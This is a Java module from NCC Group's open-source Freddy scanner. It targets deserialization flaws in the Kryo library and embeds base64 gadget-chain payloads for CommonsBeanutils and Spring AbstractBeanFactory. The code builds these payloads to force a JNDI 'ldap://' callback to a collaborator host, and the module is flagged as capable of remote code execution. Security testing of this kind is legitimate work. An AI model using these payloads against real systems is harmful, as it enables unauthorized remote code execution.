// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

/***********************************************************
 * Module targeting the Java Kryo library.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class KryoModule extends FreddyModuleBase {
	//CommonsBeanutils payload data
	private static final int COMBU_PAYLOAD_CMD_OFFSET = 169;
	private static final String COMBU_PREFIX_B64 = "AQBqYXZhLnV0aWwuVHJlZU1h8AEBAW9yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b/IBAQJqYXZhLnV0aWwuQ29sbGVjdGlvbnMkUmV2ZXJzZUNvbXBhcmF0b/IBAWRhdGFiYXNlTWV0YURhdOECAQNjb20uc3VuLnJvd3NldC5KZGJjUm93U2V0SW1w7AEAAAAAAOAPAAHJAw==";
	private static final String COMBU_SUFFIX_B64 = "AdAPAAEEamF2YS51dGlsLlZlY3Rv8gEKAgECAQIBAgECAQIBAgECAQIBAgEEAAAAAAEFamF2YS51dGlsLkhhc2h0YWJs5QEAAAABANgPAAAAAQQBCgMBZm/vAAAAAAAAAAAAAAEDBgEDBgEDBg==";
	private byte[] COMBU_PAYLOAD;
	
	//SpringAbstractBeanFactory payload data
	private static final int SABF_PAYLOAD_CMD_OFFSET = 94;
	private static final String SABF_PREFIX_B64 = "AQBqYXZhLnV0aWwuSGFzaE1h8AECAQHCAW9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLnN1cHBvcnQuRGVmYXVsdEJlYW5GYWN0b3J5UG9pbnRjdXRBZHZpc29yAQHJAw==";
	private static final String SABF_SUFFIX_B64 = "AQJvcmcuc3ByaW5nZnJhbWV3b3JrLmpuZGkuc3VwcG9ydC5TaW1wbGVKbmRpQmVhbkZhY3RvcvkBAQNvcmcuc3ByaW5nZnJhbWV3b3JrLmpuZGkuSm5kaVRlbXBsYXTlAQABBG9yZy5hcGFjaGUuY29tbW9ucy5sb2dnaW5nLmltcGwuTm9PcExv5wEBBAEBAQABAAEFamF2YS51dGlsLkhhc2hTZfQBAQMEAQABAAABBm9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLlRydWVQb2ludGN19AEBAQMBAQEAAAABBgwBAQ0=";
	private byte[] SABF_PAYLOAD;
	
	protected void initialiseModule() {
		setName("Kryo");
		setPlatform(TargetPlatform.JAVA);
		setModuleIsRCECapable(true);
		setDescriptionCaveats("");
		setRemediationDetail("");
		setSeverity(SeverityRating.HIGH);
		
		//Initialise payload buffers
		COMBU_PAYLOAD = buildBinaryPayloadBuffer(COMBU_PREFIX_B64, COMBU_SUFFIX_B64, false);
		SABF_PAYLOAD = buildBinaryPayloadBuffer(SABF_PREFIX_B64, SABF_SUFFIX_B64, false);
		
		//Register active scan payloads (passive scan is handled by KryoPassiveDetectionModule)
		registerActiveScanExceptionPayload(new byte[] {0x04}, "com.esotericsoftware.kryo.KryoException");
		
		registerActiveScanCollaboratorPayload(PN_COMBEANUTILS, true);
		registerActiveScanCollaboratorPayload(PN_SPRINGABF, true);
	}
	
	protected byte[] generateCollaboratorBytePayload(String payloadName, String hostname) {
		switch(payloadName) {
			case PN_COMBEANUTILS:
				return generateBinaryPayload(COMBU_PAYLOAD, COMBU_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
				
			case PN_SPRINGABF:
				return generateBinaryPayload(SABF_PAYLOAD, SABF_PAYLOAD_CMD_OFFSET, "ldap://" + hostname + "/", false);
		}
		return null;
	}
}
